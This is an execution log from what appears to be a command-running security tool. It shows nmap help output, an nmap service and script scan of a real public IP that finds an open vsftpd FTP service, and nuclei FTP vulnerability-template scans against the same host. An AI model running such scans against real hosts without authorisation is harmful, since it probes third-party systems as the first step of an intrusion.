2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: OUTPUT:
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: and Grepable format, respectively, to the given filename.
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: -oA <basename>: Output in the three major formats at once
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: -v: Increase verbosity level (use -vv or more for greater effect)
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: -d: Increase debugging level (use -dd or more for greater effect)
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --reason: Display the reason a port is in a particular state
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --open: Only show open (or possibly open) ports
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --packet-trace: Show all packets sent and received
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --iflist: Print host interfaces and routes (for debugging)
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --append-output: Append to rather than clobber specified output files
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --resume <filename>: Resume an aborted scan
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --noninteractive: Disable runtime interactions via keyboard
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --webxml: Reference stylesheet from Nmap.Org for more portable XML
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: MISC:
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: -6: Enable IPv6 scanning
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: -A: Enable OS detection, version detection, script scanning, and traceroute
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --datadir <dirname>: Specify custom Nmap data file location
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --send-eth/--send-ip: Send using raw ethernet frames or IP packets
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --privileged: Assume that the user is fully privileged
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: --unprivileged: Assume the user lacks raw socket privileges
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: -V: Print version number
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: -h: Print this help summary page.
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: EXAMPLES:
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: nmap -v -A scanme.nmap.org
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: nmap -v -sn 192.168.0.0/16 10.0.0.0/8
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: nmap -v -iR 10000 -Pn -p 80
2025-10-24 01:31:02,215 - __main__ - INFO - 📤 STDOUT: SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
2025-10-24 01:31:02,246 - __main__ - INFO - 🧹 CLEANUP: Process 43722 removed from registry
2025-10-24 01:31:02,246 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 255 | Duration: 0.07s
2025-10-24 01:31:02,246 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:31:02,246 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:31:02,246 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:31:02,246 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m nmap
2025-10-24 01:31:02,246 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.07s
2025-10-24 01:31:02,246 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 6002 bytes
2025-10-24 01:31:02,246 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 255
2025-10-24 01:31:02,246 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:31:02,246 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:31:02,246 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:31:02] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:31:12,160 - __main__ - INFO - 🔍 Cache MISS for command: nmap -sV -sC -p 21,22,80,443,2121 138.197.27.76
2025-10-24 01:31:12,160 - __main__ - INFO - 🚀 EXECUTING: nmap -sV -sC -p 21,22,80,443,2121 138.197.27.76
2025-10-24 01:31:12,160 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:31:12,160 - __main__ - INFO - 🆔 PROCESS: PID 43766 started
2025-10-24 01:31:12,160 - __main__ - INFO - 🆔 REGISTERED: Process 43766 - nmap -sV -sC -p 21,22,80,443,2121 138.197.27.76...
2025-10-24 01:31:12,161 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43766
2025-10-24 01:31:12,208 - __main__ - INFO - 📤 STDOUT: Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 01:31 CEST
2025-10-24 01:31:12,962 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 81 B/s | 0.8s | PID: 43766
2025-10-24 01:31:13,763 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 41 B/s | 1.6s | PID: 43766
2025-10-24 01:31:14,563 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 27 B/s | 2.4s | PID: 43766
2025-10-24 01:31:15,365 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 20 B/s | 3.2s | PID: 43766
2025-10-24 01:31:16,166 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.3%[0m Speed: 16 B/s | 4.0s | PID: 43766
2025-10-24 01:31:16,967 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.6%[0m Speed: 14 B/s | 4.8s | PID: 43766
2025-10-24 01:31:17,768 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.9%[0m Speed: 12 B/s | 5.6s | PID: 43766
2025-10-24 01:31:18,570 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.1%[0m Speed: 10 B/s | 6.4s | PID: 43766
2025-10-24 01:31:19,370 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.4%[0m Speed: 9 B/s | 7.2s | PID: 43766
2025-10-24 01:31:20,171 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.7%[0m Speed: 8 B/s | 8.0s | PID: 43766
2025-10-24 01:31:20,971 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m2.9%[0m Speed: 7 B/s | 8.8s | PID: 43766
2025-10-24 01:31:21,405 - __main__ - INFO - 📤 STDOUT: Nmap scan report for 138.197.27.76
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: Host is up (0.14s latency).
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: PORT     STATE    SERVICE     VERSION
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: 21/tcp   open     ftp         vsftpd 3.0.5
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: 22/tcp   filtered ssh
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: 80/tcp   filtered http
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: 443/tcp  filtered https
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: 2121/tcp filtered ccproxy-ftp
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: Service Info: OS: Unix
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
2025-10-24 01:31:21,409 - __main__ - INFO - 📤 STDOUT: Nmap done: 1 IP address (1 host up) scanned in 9.24 seconds
2025-10-24 01:31:21,457 - __main__ - INFO - 🧹 CLEANUP: Process 43766 removed from registry
2025-10-24 01:31:21,457 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 9.30s
2025-10-24 01:31:21,457 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:31:21,457 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:31:21,457 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:31:21,457 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m nmap -sV -sC -p 21,22,80,443,2121 138.197.27.76
2025-10-24 01:31:21,457 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 9.30s
2025-10-24 01:31:21,457 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 488 bytes
2025-10-24 01:31:21,457 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:31:21,457 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:31:21,457 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:31:21,457 - __main__ - INFO - 💾 Cached result for command: nmap -sV -sC -p 21,22,80,443,2121 138.197.27.76
2025-10-24 01:31:21,458 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:31:21] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:32:09,570 - __main__ - INFO - 🔍 Cache MISS for command: nuclei -u 138.197.27.76:21 -t /usr/share/nuclei-templates/network/ftp/ -v
2025-10-24 01:32:09,570 - __main__ - INFO - 🚀 EXECUTING: nuclei -u 138.197.27.76:21 -t /usr/share/nuclei-templates/network/ftp/ -v
2025-10-24 01:32:09,570 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:32:09,571 - __main__ - INFO - 🆔 PROCESS: PID 43855 started
2025-10-24 01:32:09,571 - __main__ - INFO - 🆔 REGISTERED: Process 43855 - nuclei -u 138.197.27.76:21 -t /usr/share/nuclei-te...
2025-10-24 01:32:09,572 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43855
2025-10-24 01:32:10,324 - __main__ - WARNING - 📥 STDERR: [[31mERR[0m] GOOGLE_API_KEY env variable exists but GOOGLE_API_CX does not
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: 
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: __     _
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: ____  __  _______/ /__  (_)
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: / __ \/ / / / ___/ / _ \/ /
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: / / / / /_/ / /__/ /  __/ /
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: /_/ /_/\__,_/\___/_/\___/_/   v3.4.10
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: 
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: projectdiscovery.io
2025-10-24 01:32:10,327 - __main__ - WARNING - 📥 STDERR: 
2025-10-24 01:32:10,372 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 325 B/s | 0.8s | PID: 43855
2025-10-24 01:32:10,798 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] nuclei-templates are not installed, installing...
2025-10-24 01:32:11,180 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 202 B/s | 1.6s | PID: 43855
2025-10-24 01:32:11,982 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 135 B/s | 2.4s | PID: 43855
2025-10-24 01:32:12,795 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 101 B/s | 3.2s | PID: 43855
2025-10-24 01:32:13,596 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.3%[0m Speed: 81 B/s | 4.0s | PID: 43855
2025-10-24 01:32:14,397 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.6%[0m Speed: 67 B/s | 4.8s | PID: 43855
2025-10-24 01:32:14,464 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] failed to get template id from file=/root/.local/nuclei-templates/helpers/payloads/swagger.json got id= err=<nil>
2025-10-24 01:32:15,208 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.9%[0m Speed: 81 B/s | 5.6s | PID: 43855
2025-10-24 01:32:15,899 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Successfully installed nuclei-templates at /root/.local/nuclei-templates
2025-10-24 01:32:15,902 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Started metrics server at localhost:9092
2025-10-24 01:32:15,904 - __main__ - WARNING - 📥 STDERR: [[31mERR[0m] Could not find template '/usr/share/nuclei-templates/network/ftp/': could not find file: open /usr/share/nuclei-templates/network/ftp/: no such file or directory
2025-10-24 01:32:15,904 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Current nuclei version: v3.4.10 ([92mlatest[0m)
2025-10-24 01:32:15,904 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Current nuclei-templates version: v10.3.0 ([92mlatest[0m)
2025-10-24 01:32:15,904 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] Scan results upload to cloud is disabled.
2025-10-24 01:32:15,904 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Targets loaded for current scan: 1
2025-10-24 01:32:15,904 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Scan completed in 815.993µs. No results found.
2025-10-24 01:32:15,905 - __main__ - WARNING - 📥 STDERR: [[1;31mFTL[0m] Could not run nuclei: no templates provided for scan
2025-10-24 01:32:15,955 - __main__ - INFO - 🧹 CLEANUP: Process 43855 removed from registry
2025-10-24 01:32:15,955 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 6.38s
2025-10-24 01:32:15,955 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:32:15,955 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:32:15,955 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:32:15,955 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m nuclei -u 138.197.27.76:21 -t /usr/share/nuclei-templat...
2025-10-24 01:32:15,955 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 6.38s
2025-10-24 01:32:15,955 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 1154 bytes
2025-10-24 01:32:15,955 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:32:15,955 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:32:15,955 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:32:15,955 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:32:15] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:32:30,493 - __main__ - INFO - 🔍 Cache MISS for command: nuclei -u ftp://138.197.27.76:21 -tags ftp -v
2025-10-24 01:32:30,493 - __main__ - INFO - 🚀 EXECUTING: nuclei -u ftp://138.197.27.76:21 -tags ftp -v
2025-10-24 01:32:30,493 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:32:30,494 - __main__ - INFO - 🆔 PROCESS: PID 43911 started
2025-10-24 01:32:30,494 - __main__ - INFO - 🆔 REGISTERED: Process 43911 - nuclei -u ftp://138.197.27.76:21 -tags ftp -v...
2025-10-24 01:32:30,494 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43911
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: [[31mERR[0m] GOOGLE_API_KEY env variable exists but GOOGLE_API_CX does not
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: 
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: __     _
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: ____  __  _______/ /__  (_)
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: / __ \/ / / / ___/ / _ \/ /
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: / / / / /_/ / /__/ /  __/ /
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: /_/ /_/\__,_/\___/_/\___/_/   v3.4.10
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: 
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: projectdiscovery.io
2025-10-24 01:32:30,584 - __main__ - WARNING - 📥 STDERR: 
2025-10-24 01:32:31,031 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Started metrics server at localhost:9092
2025-10-24 01:32:31,295 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 395 B/s | 0.8s | PID: 43911
2025-10-24 01:32:31,583 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] cause="Could not load template /root/.local/nuclei-templates/helpers/payloads/swagger.json: cause=\"mandatory 'name' field is missing\"\ncause=\"mandatory 'author' field is missing\"\ncause=\"mandatory 'id' field is missing\""
2025-10-24 01:32:32,099 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 348 B/s | 1.6s | PID: 43911
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[31mWRN[0m] Found 1 templates with syntax error (use -validate flag for further examination)
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[93mWRN[0m] Excluded 173 template[s] with known weak matchers / tags excluded from default run using .nuclei-ignore
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[93mWRN[0m] Excluded 7 self-contained template[s] (disabled as default), use -esc option to run self-contained templates.
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Current nuclei version: v3.4.10 ([92mlatest[0m)
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Current nuclei-templates version: v10.3.0 ([92mlatest[0m)
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[33mWRN[0m] Scan results upload to cloud is disabled.
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] New templates added in latest release: 124
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Templates loaded for current scan: 124
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Executing 94 signed templates from projectdiscovery/nuclei-templates
2025-10-24 01:32:32,246 - __main__ - WARNING - 📥 STDERR: [[34mINF[0m] Targets loaded for current scan: 1
2025-10-24 01:32:32,246 - __main__ - INFO - 📤 STDOUT: [[93mWRN[0m] Loading 30 unsigned templates for scan. Use with caution.
2025-10-24 01:32:32,381 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,510 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,510 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,510 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,510 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,511 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,512 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,513 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,513 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,514 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,515 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,515 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,515 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,516 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,516 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,516 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,516 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,518 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,520 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,520 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,521 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,522 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,638 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,685 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,776 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,789 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,790 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,792 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,797 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,797 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,801 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,802 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,804 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,807 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,809 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,811 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,814 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,815 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,815 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,815 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,815 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,815 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,815 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,899 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 1518 B/s | 2.4s | PID: 43911
2025-10-24 01:32:32,913 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,917 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,931 - __main__ - INFO - 📤 STDOUT: [[92mftp-detect[0m] [[94mtcp[0m] [[34minfo[0m] 138.197.27.76:21
2025-10-24 01:32:32,935 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,950 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,953 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,971 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,971 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,973 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
2025-10-24 01:32:32,974 - __main__ - WARNING - 📥 STDERR: [[34mVER[0m] Sent TCP request to 138.197.27.76:21
